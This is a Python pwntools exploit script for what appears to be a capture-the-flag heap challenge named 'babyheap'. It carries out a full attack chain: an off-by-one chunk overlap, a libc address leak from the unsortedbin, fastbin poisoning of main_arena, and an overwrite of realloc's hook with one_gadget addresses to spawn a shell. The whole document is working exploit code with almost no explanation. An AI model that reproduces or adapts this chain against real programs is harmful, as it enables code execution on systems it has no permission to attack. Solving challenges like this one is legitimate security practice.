#!/usr/bin/python3
from pwn import *
#context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']

elf = context.binary = ELF('./babyheap')
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    elif args.REM:
        return remote("",)
    else:
        return process(elf.path)


#io = start()
io = process("./babyheap")
sl      = lambda s : io.sendline(s)
sa      = lambda delim,data : io.sendafter(str(delim), str(data))
sla     = lambda delim,data : io.sendlineafter(str(delim), str(data))
sn      = lambda s : io.send(s)
rc      = lambda n : io.recv(n)
ru      = lambda delim,drop=False : io.recvuntil(delim, drop)
uu32    = lambda data            : u32(data.ljust(4, '\x00'))
uu64    = lambda data            : u64(data.ljust(8, '\x00'))
lg      = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
ti      = lambda : io.interactive()



def c(idx):
    sla("Command: ", idx)

def new(size):
    c(1)
    sla("Size: ", size)

def update(idx, size, content):
    c(2)
    sla("Index: ", idx)
    sla("Size: ", size)
    sla("Content: ", content)

def show(idx):
    c(4)
    sla("Index: ", idx)

def delete(idx):
    c(3)
    sla("Index: ", idx)



def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)

def bk():
    gdb.attach(io)
    input()

one = [0x45206,0x4525a,0xef9f4,0xf0897]

new(0x48) # 0
new(0x48) # 1
new(0x48) # 2
new(0x48) # 3
update(0, 0x49, "a"*0x48 + '\xa1') # 0x50+0x50=0xa0，为了刚好让其重叠
delete(1) # free to unsortedbin 
bk()


new(0x48) # 1 split the unsortedbinchunk1,put chunk2 to unsortedbin

show(2) # leak the libc(unsortedbin address)

a = ru("Chunk[2]: ")
addr = u64(rc(8))
print("address: ",hex(addr))
main_arena = addr - 88
print("main_arena: ", hex(main_arena))
libc.address = addr - 0x39BB78
print("libcaddress: ",hex(libc.address))

print("sucesss!")

new(0x48) #4
new(0x50) #5
delete(5)
delete(1) 
delete(2) 

b = 0x0000000000000060
update(4, 0x9,p64(b).decode("iso-8859-1"))

new(0x48) #4
new(0x50) #5 



new(0x68) #5 
new(0x68) #6 
new(0x68) #7 
new(0x68) #8 
update(5, 0x59, "a"*0x58 + '\xc1') # 0x50+0x50=0xa0，为了刚好让其重叠

delete(6) # free to unsortedbin 


new(0x68) # 6
new(0x68) # 9
new(0x60) # 10

delete(6)
delete(7) 

e = main_arena+24
update(9, 0x8,p64(e).decode("iso-8859-1"))

new(0x68) # 6
new(0x58) # 7


onegadget = one[3] + libc.address
print("onegadget:",onegadget)

#reallochook = main_arena-0x18-0x18
#reallochook = main_arena-0x18-0x10
reallochook = main_arena-0x38

#freehook = main_arena+0x1c88-0x10
payload1 = b"\x00"*0x30 + p64(reallochook) + b"\x00"*8 + p64(main_arena+0x58) + p64(main_arena+0x58) + p64(main_arena+0x68)
update(7, 0x58,payload1.decode("iso-8859-1"))

payload2 = p64(onegadget)*4
new(0x20)
update(11, 0x20,payload2.decode("iso-8859-1"))
input()
new(0x10)

input()

io.interactive()
